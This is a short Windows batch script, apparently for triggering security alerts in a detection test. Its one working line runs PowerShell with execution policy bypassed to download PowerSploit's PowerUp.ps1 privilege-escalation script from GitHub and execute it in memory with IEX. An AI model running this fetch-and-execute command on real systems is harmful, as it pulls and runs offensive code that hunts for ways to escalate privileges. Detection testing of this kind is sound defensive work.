@echo off
echo [+] Performing test alerts PowerSploit

powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1');Invoke-AllChecks"


pause
